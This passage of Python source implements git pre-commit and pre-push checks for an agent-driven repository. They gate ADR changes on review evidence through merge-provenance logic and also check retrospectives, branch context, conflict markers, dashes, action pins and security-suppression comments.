def _has_duplicate_frontmatter_keys(frontmatter: str) -> bool:
    seen: set[str] = set()
    for line in frontmatter.splitlines():
        if line.startswith((" ", "\t")):
            continue
        match = FRONTMATTER_FIELD_RE.match(line)
        if match is None:
            continue
        key = match.group(1)
        if key in seen:
            return True
        seen.add(key)
    return False


def _parse_frontmatter(frontmatter: str) -> dict[str, object] | None:
    if _has_duplicate_frontmatter_keys(frontmatter):
        return None
    try:
        loaded = yaml.safe_load(frontmatter)
    except yaml.YAMLError:
        return None
    if loaded is None:
        return {}
    return loaded if isinstance(loaded, dict) else None


def _only_implemented_field_changed(
    old_frontmatter: str,
    new_frontmatter: str,
) -> bool:
    old_fields = _parse_frontmatter(old_frontmatter)
    new_fields = _parse_frontmatter(new_frontmatter)
    if old_fields is None or new_fields is None:
        return False
    changed = {
        key
        for key in old_fields.keys() | new_fields.keys()
        if old_fields.get(key) != new_fields.get(key)
    }
    return bool(changed) and changed <= {"implemented"}


def _is_frontmatter_only_metadata_change(path: str, repo_root: Path) -> bool:
    pair = _frontmatter_pair_for_a_body_unchanged_edit(path, repo_root)
    if pair is None:
        return False
    return _only_implemented_field_changed(*pair)


def _is_skill_frontmatter_only_change(path: str, repo_root: Path) -> bool:
    """Return True for a staged SKILL.md ADR-080 model-pin-only frontmatter edit.

    SkillForge validation (``validate-skill.py``) checks both the body
    (Triggers, Process, Verification, Scripts sections) and the frontmatter
    (required and allowed keys). A body-unchanged edit cannot regress the
    structural verdict, but a frontmatter edit still can, so this exemption is
    deliberately narrow: it skips validation only when the body text is
    unchanged from HEAD (bodies compared as the bytes git stored, never as
    decoded text) AND the sole changed frontmatter keys
    are the ADR-080 model-pin
    fields (``model``, ``model-rationale``). Any other frontmatter delta, for
    example deleting ``name``/``description`` or introducing an unexpected key,
    still runs the validator. Mirrors the field-scoped precedent in
    ``_only_implemented_field_changed``.

    Returns False for newly added skills (no HEAD blob) so genuinely new skills
    are always validated.
    """
    pair = _frontmatter_pair_for_a_body_unchanged_edit(path, repo_root)
    if pair is None:
        return False
    return _only_model_pin_fields_changed(*pair)


_ADR080_MODEL_PIN_FIELDS = frozenset({"model", "model-rationale"})


def _only_model_pin_fields_changed(
    old_frontmatter: str,
    new_frontmatter: str,
) -> bool:
    old_fields = _parse_frontmatter(old_frontmatter)
    new_fields = _parse_frontmatter(new_frontmatter)
    # Require both parsed dicts non-empty (falsy covers None and {}). Comment-only
    # or whitespace-only frontmatter yaml-loads to an empty dict; treating that as
    # a model-pin-only change would skip validation on a SKILL.md that effectively
    # has no frontmatter fields, which is invalid and must be validated.
    if not old_fields or not new_fields:
        return False
    changed = {
        key
        for key in old_fields.keys() | new_fields.keys()
        if old_fields.get(key) != new_fields.get(key)
    }
    return bool(changed) and changed <= _ADR080_MODEL_PIN_FIELDS


def _gated_adr_review_paths(paths: Sequence[str], repo_root: Path) -> list[str]:
    gated: list[str] = []
    for path in paths:
        if ADR_REVIEW_PATH_RE.search(path) is None:
            continue
        if ADR_PATH_RE.search(path) and _is_frontmatter_only_metadata_change(path, repo_root):
            continue
        gated.append(path)
    return gated


def _extract_adr_ids(paths: Sequence[str]) -> set[str]:
    return {
        match.group(0).upper()
        for path in paths
        if (match := ADR_ID_RE.search(Path(path).name)) is not None
    }


def _debate_references_adr(debate_path: Path, adr_ids: set[str]) -> bool:
    if debate_path.is_symlink():
        return False
    try:
        content = debate_path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return False
    referenced = {match.group(0).upper() for match in ADR_ID_RE.finditer(content)}
    return bool(referenced & adr_ids)


def _session_has_adr_review(session_log: Path) -> bool:
    if session_log.is_symlink():
        return False
    try:
        content = session_log.read_text(encoding="utf-8")
    except OSError:
        return False
    return any(pattern.search(content) for pattern in ADR_REVIEW_PATTERNS)


def check_adr_review_policy(paths: Sequence[str], repo_root: Path) -> int:
    gated_paths = _gated_adr_review_paths(paths, repo_root)
    if not gated_paths:
        return 0
    if _merge_in_progress(repo_root):
        gated_paths = _merge_authored_adr_paths(gated_paths, repo_root)
        if not gated_paths:
            return 0

    session_log = _today_session_log(repo_root / ".agents" / "sessions")
    if session_log is None or not _session_has_adr_review(session_log):
        print(
            "ERROR: ADR changes require adr-review evidence in today's session log",
            file=sys.stderr,
        )
        return 1

    analysis_dir = repo_root / ".agents" / "analysis"
    try:
        debate_logs = list(analysis_dir.glob("*debate*.md"))
    except OSError:
        debate_logs = []
    if not debate_logs:
        print("ERROR: ADR changes require a debate log in .agents/analysis", file=sys.stderr)
        return 1

    adr_ids = _extract_adr_ids(gated_paths)
    if adr_ids and not any(_debate_references_adr(path, adr_ids) for path in debate_logs):
        names = ", ".join(sorted(adr_ids))
        print(f"ERROR: no debate log references the staged ADR IDs: {names}", file=sys.stderr)
        return 1
    return 0


def _merge_authored_adr_paths(paths: Sequence[str], repo_root: Path) -> list[str]:
    # A branch takes main's work two ways and only one of them leaves a main
    # ancestor in MERGE_HEAD. Merging main in directly does. Merging the shared
    # branch's own remote tip, after a collaborator merged main there and
    # pushed, does not: the parent is the branch. Without the second rule below
    # every ADR main contributed reads as branch-authored and the gate demands
    # review evidence for a file the author never opened.
    approved_parents = _approved_merge_head_commits(repo_root)
    merge_parents = _merge_head_commits(repo_root)
    authored: list[str] = []
    for path in paths:
        staged_blob = _read_index_blob(repo_root, path)
        if staged_blob is None:
            authored.append(path)
            continue
        if _read_head_blob(repo_root, path) == staged_blob:
            continue
        if _blob_is_at_any(repo_root, approved_parents, path, staged_blob):
            continue
        if _blob_arrived_through_the_merge(repo_root, merge_parents, path, staged_blob):
            continue
        authored.append(path)
    return authored


def _blob_is_at_any(
    repo_root: Path,
    commits: Sequence[str],
    path: str,
    blob: bytes,
) -> bool:
    return any(_read_commit_blob_bytes(repo_root, commit, path) == blob for commit in commits)


def _blob_arrived_through_the_merge(
    repo_root: Path,
    merge_parents: Sequence[str],
    path: str,
    blob: bytes,
) -> bool:
    """Report whether a staged blob looks like content the merge carried in.

    "Looks like" is the honest verb. Every comparison here is against the
    local `refs/remotes/origin/main`, which is a cached answer to what main
    held at the last fetch, not what main holds now. The gate is offline and
    cannot do better, so it is proving a resemblance rather than provenance,
    and that is the ceiling on what this function can be trusted for.

    Three questions, each closing a way past the other two.

    The blob has to sit on a merge parent, or an author can type a reversion
    during someone else's merge and the stale `origin/main` it matches will
    wave it through. It has to match `origin/main`, or any pair of branches
    can walk an unreviewed ADR onto main because the merge carried it.

    Those two alone still lose to an author who builds the merge: branch off
    the newer commit, commit the older text there, merge it back, and both
    hold. So the third question asks about the copy this branch already has.
    Content arriving from main is an upgrade, and the copy being replaced is
    one that ref has carried at some point. A reversion is not, because the
    newer text it overwrites was written locally and never pushed.
    """
    if not _blob_is_at_any(repo_root, merge_parents, path, blob):
        return False
    if _read_commit_blob_bytes(repo_root, "origin/main", path) != blob:
        return False
    return _head_copy_is_one_main_has_carried(repo_root, path)


def _head_copy_is_one_main_has_carried(repo_root: Path, path: str) -> bool:
    """Report whether HEAD's copy of a path is a state `origin/main` has held.

    A path HEAD does not carry cannot be a regression of local work, so it
    passes. Otherwise the copy has to be one of the blobs this file has held
    in `origin/main`. Walking the file's own history keeps this to the handful
    of commits that touched one ADR rather than the whole branch.

    Identity is the blob id, not the bytes, because git already computed the
    answer and an id cannot be normalized into agreeing with a different blob.

    `origin/main` is a local cache of main, so a branch that has not fetched
    in a while can fail this on content main really does carry. That
    direction is the safe one: the answer is review evidence demanded for a
    file that did not need it, and a fetch clears it.
    """
    head_blob_id = _blob_id_at(repo_root, "HEAD", path)
    if head_blob_id is None:
        return True
    return head_blob_id in _origin_main_blob_ids(repo_root, path)


def _blob_id(repo_root: Path, revision: str) -> str | None:
    result = _run_git(repo_root, ["rev-parse", "--verify", "--quiet", f"{revision}"])
    identifier = result.stdout.strip()
    return identifier if result.returncode == 0 and identifier else None


def _origin_main_blob_ids(repo_root: Path, path: str) -> set[str]:
    """Every blob `path` has held in `origin/main`, following it through renames.

    Asking `rev-list` for one pathname stops at the rename, so an ADR that was
    moved and revised on main left its earlier states behind under the former
    name. A branch that had also moved the file then held a copy main really
    had carried, failed this check on the name alone, and had review evidence
    demanded of it for someone else's revision.

    Two traversals, because neither answers the question alone.

    `separate` splits a merge into one diff per parent, which is what makes a
    conflict main resolved leave an id behind. `--raw` prints nothing for a
    merge otherwise, so an ADR whose only appearance in some state was a
    resolution was invisible here.

    `off` is not redundant with it. `--follow` rewrites the path it follows
    each time it detects a rename, so which renames are visible decides which
    lineage it walks. With merge diffs asked for, the merge-versus-first-parent
    rename becomes visible, following it walks main's side, and a side branch
    that renamed the file is reported as a deletion rather than crossed into.
    The states on that side are states of this file on `origin/main`, and
    asking for the resolution must not cost them.

    Every id either traversal reports comes from a commit reachable from
    `origin/main`, so the union widens exactly one file's lineage rather than
    admitting any blob the branch happens to contain.
    """
    return _followed_blob_ids(repo_root, path, "off") | _followed_blob_ids(
        repo_root, path, "separate"
    )


def _approved_merge_head_commits(repo_root: Path) -> list[str]:
    return [
        commit
        for commit in _merge_head_commits(repo_root)
        if _commit_is_origin_main_ancestor(repo_root, commit)
    ]


def _merge_head_commits(repo_root: Path) -> list[str]:
    result = _run_git(repo_root, ["rev-parse", "--git-path", "MERGE_HEAD"])
    if result.returncode != 0:
        return []
    merge_head = Path(result.stdout.strip())
    if not merge_head.is_absolute():
        merge_head = repo_root / merge_head
    try:
        named = [
            line.strip()
            for line in merge_head.read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
    except OSError:
        return []
    return [commit for commit in named if not _head_already_contains(repo_root, commit)]


def _head_already_contains(repo_root: Path, commit: str) -> bool:
    """Report whether HEAD already contains a commit named by `MERGE_HEAD`.

    `git merge <ancestor>` says "Already up to date" and writes no `MERGE_HEAD`
    at all, so a `MERGE_HEAD` naming something HEAD already has was written by
    something other than git. Reading it as a merge in progress hands the
    exemption to anyone who can write one file, and the ancestor it names is an
    approved parent by construction, which is the whole gate.
    """
    result = _run_git(repo_root, ["merge-base", "--is-ancestor", commit, "HEAD"])
    return result.returncode == 0


def _commit_is_origin_main_ancestor(repo_root: Path, commit: str) -> bool:
    result = _run_git(repo_root, ["merge-base", "--is-ancestor", commit, "origin/main"])
    return result.returncode == 0


def _read_commit_blob_bytes(repo_root: Path, commit: str, relative_path: str) -> bytes | None:
    """Read a blob as the bytes git stored, not as text that survived a decode.

    The three readers here answer one question, whether two blobs are the same
    blob, and a text pipe cannot answer it. `encoding=` puts the pipe in text
    mode, which folds `\\r\\n` and lone `\\r` into `\\n`, and `errors="replace"`
    turns every byte the decoder cannot read into one replacement character.
    Both are lossy in the same direction: distinct blobs come back equal, and
    the ADR gate reads equal as "the merge carried main's content".
    """
    result = _run_git_bytes(repo_root, ["show", f"{commit}:{relative_path}"])
    if result.returncode != 0:
        return None
    return result.stdout


def _session_has_retrospective_evidence(session_log: Path) -> bool:
    if session_log.is_symlink():
        return False
    try:
        content = session_log.read_text(encoding="utf-8")
    except OSError:
        return False
    return any(pattern.search(content) for pattern in RETROSPECTIVE_EVIDENCE_PATTERNS)


def _today_retrospective_exists(repo_root: Path) -> bool:
    retro_dir = repo_root / ".agents" / "retrospective"
    if not retro_dir.is_dir():
        return False
    today, yesterday = _recent_date_prefixes()
    try:
        for prefix in (today, yesterday):
            if any(not path.is_symlink() for path in retro_dir.glob(f"{prefix}*.md")):
                return True
        return False
    except OSError:
        return False


def _documentation_only(paths: Sequence[str]) -> bool:
    return bool(paths) and all(
        any(pattern.search(path) for pattern in DOCUMENTATION_PATTERNS) for path in paths
    )


def _is_trivial_retrospective_session(
    session_log: Path | None,
    paths: Sequence[str],
    *,
    now_epoch: float | None = None,
) -> bool:
    if session_log is None or len(paths) != 1:
        return False
    try:
        created = session_log.stat().st_ctime
    except OSError:
        return False
    current = datetime.now(tz=UTC).timestamp() if now_epoch is None else now_epoch
    return current - created <= TRIVIAL_SESSION_SECONDS


def check_retrospective_evidence(paths: Sequence[str], repo_root: Path) -> int:
    if os.environ.get("SKIP_RETROSPECTIVE_GATE") == "true":
        print("Retrospective policy bypassed via SKIP_RETROSPECTIVE_GATE=true")
        return 0
    if not paths:
        print(
            "WARNING: {push_files} empty; cannot determine documentation-only or "
            "trivial-session bypass, retrospective evidence still required",
            file=sys.stderr,
        )
    if paths and _documentation_only(paths):
        return 0

    session_log = _today_session_log(repo_root / ".agents" / "sessions")
    if paths and _is_trivial_retrospective_session(session_log, paths):
        return 0
    if _today_retrospective_exists(repo_root):
        return 0
    if session_log is not None and _session_has_retrospective_evidence(session_log):
        return 0

    print("ERROR: git push requires retrospective evidence for this session", file=sys.stderr)
    return 1


def _session_branch(session_log: Path) -> str | None:
    """Extract the expected branch from a session log.

    Canonical logs nest the branch at ``session.branch`` (see
    .agents/schemas/session-log.schema.json); pre-schema logs carry a
    top-level ``branch``. The nested value wins, then the top level.
    """
    try:
        data = json.loads(session_log.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return None
    if not isinstance(data, dict):
        return None
    candidates: list[object] = []
    session = data.get("session")
    if isinstance(session, dict):
        candidates.append(session)
    candidates.append(data)
    for container in candidates:
        if isinstance(container, dict):
            branch = container.get("branch")
            if isinstance(branch, str):
                return branch
    return None


def check_branch_context(repo_root: Path) -> int:
    """Block a commit or push when the branch contradicts today's session log.

    Ported from the retired Claude PreToolUse hook
    ``invoke_branch_context_guard.py`` so the branch-mismatch safety net
    survives the move to Lefthook. Root cause: PR co-mingling from the
    PR #669 retrospective (Issue #682).

    The check is deliberately fail-open: it returns 0 (pass) on every
    ambiguous input and only returns 1 (block) when it can prove a
    mismatch. Retired-hook contract preserved verbatim:

        # Skip if no sessions directory (consumer repo)
        # Cannot determine branch, fail open
        # No session log, let session_log_guard handle this
        # No branch in session log, skip check

    Only a determinate ``current_branch != session_branch`` blocks. Three
    exemptions. A merge in progress is exempt: a merge legitimately imports
    another branch's newer session log into the tree, which would otherwise
    read as a mismatch. A committed merge is exempt on the same grounds but
    needs a different test, because ``MERGE_HEAD`` is gone by then while the
    imported log stays and keeps winning the recency comparison forever. That
    case requires both that the branch owns a recent log and that the newest
    log already exists on the upstream default branch, which makes it settled
    history rather than a claim about current work (issue #3343). A log
    authored on another local branch is not upstream, so the co-mingling case
    from issue #682 still blocks.

    A linked worktree gets a third exemption. Its ``.agents/sessions`` is a
    checkout of some branch's history, so a log present in ``HEAD`` names
    whatever that branch last recorded and says nothing about the developer's
    current work. Blocking on it forced ``--no-verify`` on every worktree
    commit, which disabled every other hook to silence this one (issue #3408).
    The exemption is limited to logs present in the worktree's own ``HEAD``
    (the ``_is_committed_here`` probe): a log that exists only as an untracked
    working-tree file is a live claim, so a real mismatch there still blocks.
    """
    try:
        if _merge_in_progress(repo_root):
            return 0
        sessions_dir = repo_root / ".agents" / "sessions"
        if not sessions_dir.is_dir():
            return 0
        current_branch = _current_branch(repo_root)
        if current_branch is None:
            return 0
        session_log = _today_session_log(sessions_dir)
        if session_log is None:
            return 0
        session_branch = _session_branch(session_log)
        if session_branch is None:
            return 0
        if current_branch == session_branch:
            return 0
        if _session_log_for_branch(sessions_dir, current_branch) is not None and _is_merged_history(
            repo_root, session_log
        ):
            return 0
        if _is_linked_worktree(repo_root) and _is_committed_here(repo_root, session_log):
            return 0
        print(
            "ERROR: branch context mismatch: "
            f"current='{current_branch}', session='{session_branch}' "
            f"(log: {session_log.name})",
            file=sys.stderr,
        )
        print(
            "  Fix: switch to the expected branch, update the session log branch "
            "field, or run /session-init for the current branch.",
            file=sys.stderr,
        )
        return 1
    except Exception:
        return 0


def check_handoff(paths: Sequence[str], repo_root: Path) -> int:
    del repo_root
    normalized = {_safe_relative_path(path) for path in paths}
    if ".agents/HANDOFF.md" not in normalized:
        return 0
    print("ERROR: .agents/HANDOFF.md is read-only", file=sys.stderr)
    return 1


def _merge_in_progress(repo_root: Path) -> bool:
    result = _run_git(repo_root, ["rev-parse", "--git-path", "MERGE_HEAD"])
    if result.returncode != 0:
        return False
    merge_head = Path(result.stdout.strip())
    if not merge_head.is_absolute():
        merge_head = repo_root / merge_head
    return merge_head.is_file()


def _git_path(repo_root: Path, path_name: str) -> Path | None:
    result = _run_git(repo_root, ["rev-parse", "--git-path", path_name])
    if result.returncode != 0:
        return None
    path_text = result.stdout.strip()
    if not path_text:
        return None
    path = Path(path_text)
    return path if path.is_absolute() else repo_root / path


def _active_git_operation(repo_root: Path) -> tuple[str, str] | None:
    for path_name, operation, remedy in ACTIVE_GIT_OPERATION_FILES:
        git_path = _git_path(repo_root, path_name)
        if git_path is not None and git_path.is_file():
            return operation, remedy
    return None


def check_active_git_operation(repo_root: Path) -> int:
    active = _active_git_operation(repo_root)
    if active is None:
        return 0
    operation, remedy = active
    unmerged = _unmerged_paths(repo_root)
    print(f"ERROR: cannot push while a {operation} in progress", file=sys.stderr)
    if unmerged is None:
        print("  Unmerged paths could not be listed.", file=sys.stderr)
    elif unmerged:
        print("  Unmerged paths:", file=sys.stderr)
        for path in unmerged:
            print(f"    {path}", file=sys.stderr)
    else:
        print(
            "  No unmerged paths remain, but the operation has not been committed.",
            file=sys.stderr,
        )
    print(f"  Fix: resolve the operation with {remedy}.", file=sys.stderr)
    return 1


def _unmerged_paths(repo_root: Path) -> list[str] | None:
    result = _run_git(repo_root, ["diff", "--name-only", "--diff-filter=U"])
    if result.returncode != 0:
        _print_process_output(result)
        return None
    return [line for line in result.stdout.splitlines() if line]


def _paths_on_merge_head(paths: Sequence[str], repo_root: Path) -> set[str]:
    """Return the subset of *paths* that exist on MERGE_HEAD.

    Used by ``check_adr_review_policy`` to exempt only the ADR paths that
    came from the merge parent (main) while still gating branch-authored
    ADR content.  Returns the empty set on any git error (fail open to the
    caller's gating logic).
    """
    result = _run_git(repo_root, ["rev-parse", "MERGE_HEAD"])
    if result.returncode != 0:
        return set()
    merge_head = result.stdout.strip()
    present: set[str] = set()
    for path in paths:
        check = _run_git(repo_root, ["cat-file", "-e", f"{merge_head}:{path}"])
        if check.returncode == 0:
            present.add(path)
    return present


def check_sessions(paths: Sequence[str], repo_root: Path) -> int:
    if _merge_in_progress(repo_root):
        return 0
    sessions = [
        path
        for raw_path in paths
        if (path := _safe_relative_path(raw_path)) and SESSION_PATH_RE.fullmatch(path)
    ]
    if not sessions:
        print("ERROR: staged .agents changes require a JSON session log", file=sys.stderr)
        return 1
    for session in sessions:
        result = _run_command(
            [
                sys.executable,
                "scripts/validate_session_json.py",
                session,
                "--pre-commit",
            ],
            repo_root,
        )
        if result.returncode != 0:
            _print_process_output(result)
            return result.returncode
    return 0


def check_commit_message(message_path: Path) -> int:
    if not message_path.is_file():
        return 0
    message = message_path.read_text(encoding="utf-8", errors="replace")
    if not any(dash in message for dash in PROHIBITED_DASHES):
        return 0
    print(
        "ERROR: commit message contains em-dash (U+2014) or en-dash (U+2013)",
        file=sys.stderr,
    )
    return 1


def check_staged_dashes(paths: Sequence[str], repo_root: Path) -> int:
    violations: list[str] = []
    for raw_path in paths:
        path = _safe_relative_path(raw_path)
        if path is None:
            print(f"ERROR: unsafe staged path: {raw_path}", file=sys.stderr)
            return 2
        if path.startswith(SKIPPED_DASH_PREFIXES):
            continue
        content = _read_index_blob(repo_root, path)
        if content is None:
            continue
        text = content.decode("utf-8", errors="replace")
        if any(dash in text for dash in PROHIBITED_DASHES):
            violations.append(path)
    if not violations:
        return 0
    print("ERROR: staged markdown contains prohibited Unicode dashes:", file=sys.stderr)
    for path in violations:
        print(f"  {path}", file=sys.stderr)
    return 1


def _conflict_marker_violations(path: str, content: bytes) -> list[str]:
    """Report labelled conflict markers that sit outside a fenced code block.

    Documentation that teaches conflict resolution quotes the markers inside a
    fence; a real conflict written by git never is. Tracking the fence is what
    keeps `.claude/skills/merge-resolver/references/strategies.md` clean.
    """
    violations: list[str] = []
    inside_fence = False
    lines = content.decode("utf-8", errors="replace").splitlines()
    for line_number, line in enumerate(lines, start=1):
        if MARKDOWN_FENCE_RE.match(line):
            inside_fence = not inside_fence
            continue
        if inside_fence:
            continue
        if CONFLICT_MARKER_RE.match(line):
            violations.append(f"{path}:{line_number}: {line[:40]}")
    return violations


def _is_unmerged_path(repo_root: Path, relative_path: str) -> bool:
    """A path in the index but not at stage 0 is mid-conflict."""
    result = _run_git(repo_root, ["ls-files", "-u", "--", relative_path])
    return result.returncode == 0 and bool(result.stdout.strip())


def check_staged_conflict_markers(paths: Sequence[str], repo_root: Path) -> int:
    violations: list[str] = []
    unmerged: list[str] = []
    for raw_path in paths:
        path = _safe_relative_path(raw_path)
        if path is None:
            print(f"ERROR: unsafe staged path: {raw_path}", file=sys.stderr)
            return 2
        if path.startswith(SKIPPED_DASH_PREFIXES):
            continue
        content = _read_index_blob(repo_root, path)
        if content is None:
            # Stage 0 is absent during a conflict; say so instead of
            # skipping the one state this gate exists to catch (issue #3770).
            if _is_unmerged_path(repo_root, path):
                unmerged.append(path)
            continue
        violations.extend(_conflict_marker_violations(path, content))
    if unmerged:
        print("ERROR: paths have unresolved merge conflicts:", file=sys.stderr)
        for path in unmerged:
            print(f"  {path}", file=sys.stderr)
        print(
            "Resolve the conflict and `git add` each path before committing.",
            file=sys.stderr,
        )
        return 1
    if not violations:
        return 0
    print("ERROR: staged content contains git conflict markers:", file=sys.stderr)
    for violation in violations:
        print(f"  {violation}", file=sys.stderr)
    print(
        "Resolve the conflict and restage. To quote a marker in documentation, "
        "put it inside a fenced code block.",
        file=sys.stderr,
    )
    return 1


def _tracked_file_bytes(full_path: Path) -> bytes | None:
    """Content to scan, or None when the path has no scannable content.

    Symlinks and gitlink directories are skipped: the tracked object is the
    link target string or the submodule commit, and following the link could
    read outside the repo. A missing file is a sparse-checkout concern, not a
    conflict. Binary detection stops at the sniff window rather than pulling
    the rest into memory only to discard it: the 26 binary files tracked
    today are 26.4 MB, 26.8% of the 98.5 MB this walk would otherwise read.
    Other OSErrors propagate for the caller to map to a config error.
    """
    if full_path.is_symlink() or full_path.is_dir():
        return None
    try:
        with full_path.open("rb") as handle:
            head = handle.read(_BINARY_SNIFF_BYTES)
            if b"\0" in head:
                return None
            return head + handle.read()
    except FileNotFoundError:
        return None


def check_tracked_conflict_markers(repo_root: Path) -> int:
    """Fail when any tracked file carries a conflict marker (issue #3770).

    ``staged-conflict-markers`` runs at pre-commit over the index, which is the
    right place to catch a marker as it is written but the wrong place to be the
    only check. Every route that skips local hooks reaches the remote unchecked:
    a server-side merge from the "Update branch" button, ``--no-verify``, a
    clone where ``lefthook install`` was never run, a bot push.

    One instance is already in the history. Commit ``b71580c23`` landed two
    unresolved hunks in ``tests/test_lefthook_integration.py`` while neither
    parent carried any, then survived four further merges. The thing that caught
    it was CI's Python syntax check, which is incidental coverage: it exists to
    enforce the 3.10 syntax floor, it only reads Python, and a marker in
    Markdown or YAML has no equivalent anywhere.

    This walks the whole tracked tree rather than a diff so that a marker
    introduced by any route is caught by the PR that carries it, not by whatever
    unrelated parser happens to choke first. The tree is clean today (0 hits
    across 7,530 tracked files), so this is a ratchet at zero and needs no
    allowlist.
    """
    result = _run_git(repo_root, ["ls-files", "-z"])
    if result.returncode != 0:
        print("ERROR: could not list tracked files", file=sys.stderr)
        return 2
    violations: list[str] = []
    # ``-z`` NUL-terminates every entry, so a plain split leaves a trailing
    # empty element. Strip it here rather than guarding inside the loop.
    tracked = result.stdout.rstrip("\0").split("\0") if result.stdout else []
    for raw_path in tracked:
        if raw_path.startswith(SKIPPED_DASH_PREFIXES):
            continue
        path = _safe_relative_path(raw_path)
        if path is None:
            print(
                f"ERROR: refusing unsafe tracked path {raw_path!r}",
                file=sys.stderr,
            )
            return 2
        try:
            content = _tracked_file_bytes(repo_root / path)
        except OSError as exc:
            # Permissions or I/O errors are an environment the scan cannot
            # vouch for; silently continuing would report clean on a tree it
            # did not read.
            print(
                f"ERROR: could not read tracked file {path}: {exc}",
                file=sys.stderr,
            )
            return 2
        if content is None:
            continue
        violations.extend(_conflict_marker_violations(path, content))
    if not violations:
        return 0
    print("ERROR: tracked files contain git conflict markers:", file=sys.stderr)
    for violation in violations:
        print(f"  {violation}", file=sys.stderr)
    print(
        "Resolve the conflict and push the fix. To quote a marker in "
        "documentation, put it inside a fenced code block.",
        file=sys.stderr,
    )
    return 1


def check_staged_action_pins(paths: Sequence[str], repo_root: Path) -> int:
    violations: list[str] = []
    for raw_path in paths:
        path = _safe_relative_path(raw_path)
        if path is None:
            return 2
        content = _read_index_blob(repo_root, path)
        if content is None:
            continue
        violations.extend(_action_pin_violations(path, content))
    if not violations:
        return 0
    print("ERROR: GitHub Actions must be pinned to commit SHAs:", file=sys.stderr)
    for violation in violations:
        print(f"  {violation}", file=sys.stderr)
    return 1


def _action_pin_violations(path: str, content: bytes) -> list[str]:
    violations: list[str] = []
    for line_number, line in enumerate(
        content.decode("utf-8", errors="replace").splitlines(),
        start=1,
    ):
        if LOCAL_ACTION_PATTERN.search(line):
            continue
        if VERSION_TAG_PATTERN.match(line):
            violations.append(f"{path}:{line_number}")
    return violations


def check_github_bash_scripts(paths: Sequence[str], repo_root: Path) -> int:
    violations: list[str] = []
    for raw_path in paths:
        path = _safe_relative_path(raw_path)
        if path is None:
            return 2
        if not path.startswith(".github/scripts/"):
            continue
        content = _read_index_blob(repo_root, path)
        if content is None:
            continue
        first_line = content.splitlines()[0] if content else b""
        if Path(path).suffix in {".bash", ".sh"} or (
            first_line.startswith(b"#!") and b"bash" in first_line
        ):
            violations.append(path)
    if not violations:
        return 0
    print("ERROR: Bash scripts are prohibited under .github/scripts:", file=sys.stderr)
    for violation in violations:
        print(f"  {violation}", file=sys.stderr)
    return 1


def check_security_suppressions(paths: Sequence[str], repo_root: Path) -> int:
    violations: list[str] = []
    for raw_path in paths:
        path = _safe_relative_path(raw_path)
        if path is None:
            print(f"ERROR: unsafe security-scan path: {raw_path}", file=sys.stderr)
            return 2
        full_path = repo_root / path
        if not full_path.is_file() or full_path.is_symlink():
            continue
        violations.extend(_security_suppression_violations(path, full_path))
    if not violations:
        return 0
    print("ERROR: security suppression comments detected:", file=sys.stderr)
    for violation in violations:
        print(f"  {violation}", file=sys.stderr)
    return 1


def _security_suppression_violations(path: str, full_path: Path) -> list[str]:
    violations: list[str] = []
    for line_number, line in enumerate(
        full_path.read_text(encoding="utf-8", errors="replace").splitlines(),
        start=1,
    ):
        if SECURITY_SUPPRESSION_RE.search(line):
            violations.append(f"{path}:{line_number}")
    return violations


def _generated_candidates(kind: str, repo_root: Path) -> list[Path]:
    candidates = [repo_root / path for path in GENERATED_PATHS.get(kind, ())]
    for pattern in GENERATED_GLOBS.get(kind, ()):
        candidates.extend(repo_root.glob(pattern))
    return sorted(set(candidates))


def _matches_generated_glob(relative_path: str, pattern: str) -> bool:
    path_parts = PurePosixPath(relative_path).parts
    pattern_parts = PurePosixPath(pattern).parts
    matches = [True]
    for pattern_part in pattern_parts:
        matches.append(matches[-1] and pattern_part == "**")
    for path_part in path_parts:
        next_matches = [False]
        for index, pattern_part in enumerate(pattern_parts, start=1):
            if pattern_part == "**":
                next_matches.append(next_matches[index - 1] or matches[index])
                continue
            next_matches.append(matches[index - 1] and fnmatch(path_part, pattern_part))
        matches = next_matches
    return matches[-1]


def _is_allowlisted_generated_path(kind: str, relative_path: str) -> bool:
    if relative_path in GENERATED_PATHS.get(kind, ()):
        return True
    return any(
        _matches_generated_glob(relative_path, pattern) for pattern in GENERATED_GLOBS.get(kind, ())
    )


def _deleted_generated_candidates(kind: str, repo_root: Path) -> list[Path] | None:
    result = _run_git_bytes(
        repo_root,
        ["diff", "--name-only", "--diff-filter=D", "-z", "--"],
    )
    if result.returncode != 0:
        if result.stdout:
            print(result.stdout.decode("utf-8", errors="replace"), end="")
        if result.stderr:
            print(
                result.stderr.decode("utf-8", errors="replace"),
                end="",
                file=sys.stderr,
            )
        return None

    candidates: list[Path] = []
    for raw_path in result.stdout.split(b"\0"):
        if not raw_path:
            continue
        relative_path = os.fsdecode(raw_path)
        safe_path = _safe_relative_path(relative_path)
        candidate = _safe_output_path(repo_root, relative_path)
        if safe_path is None or candidate is None:
            print(
                f"ERROR: unsafe tracked deletion path: {relative_path}",
                file=sys.stderr,
            )
            return None
        if _is_allowlisted_generated_path(kind, safe_path):
            candidates.append(candidate)
    return candidates


def stage_generated(kind: str, repo_root: Path) -> int:
    safety_result = check_generated_paths(kind, repo_root)
    if safety_result != 0:
        return safety_result
    deleted_candidates = _deleted_generated_candidates(kind, repo_root)
    if deleted_candidates is None:
        return 2
    tracked_deletions = set(deleted_candidates)
    candidates = set(_generated_candidates(kind, repo_root))
    candidates.update(tracked_deletions)
    relative_paths: list[str] = []
    for candidate in sorted(candidates):
        if not candidate.exists() and candidate not in tracked_deletions:
            continue
        try:
            relative_path = candidate.relative_to(repo_root).as_posix()
        except ValueError:
            return 2
        if _safe_output_path(repo_root, relative_path) is None:
            print(f"ERROR: refusing to stage unsafe path: {relative_path}", file=sys.stderr)
            return 2
        relative_paths.append(relative_path)
    if not relative_paths:
        return 0
    result = _run_git(repo_root, ["add", "--", *relative_paths])
    if result.returncode != 0:
        _print_process_output(result)
    return result.returncode


def extract_session_episodes(paths: Sequence[str], repo_root: Path) -> int:
    if check_generated_paths("episodes", repo_root) != 0:
        return 2
    for raw_path in paths:
        path = _safe_relative_path(raw_path)
        if path is None or not SESSION_PATH_RE.fullmatch(path):
            print(f"ERROR: invalid session path: {raw_path}", file=sys.stderr)
            return 2
        result = _run_command(
            [
                sys.executable,
                ".claude/skills/memory/scripts/extract_session_episode.py",
                path,
                "--preserve",
                "--pending-stage",
            ],
            repo_root,
        )
        if result.returncode != 0:
            _print_advisory_failure("episode extraction", result)
            continue
        episode_id = _episode_id_from_output(result.stdout)
        if episode_id is None:
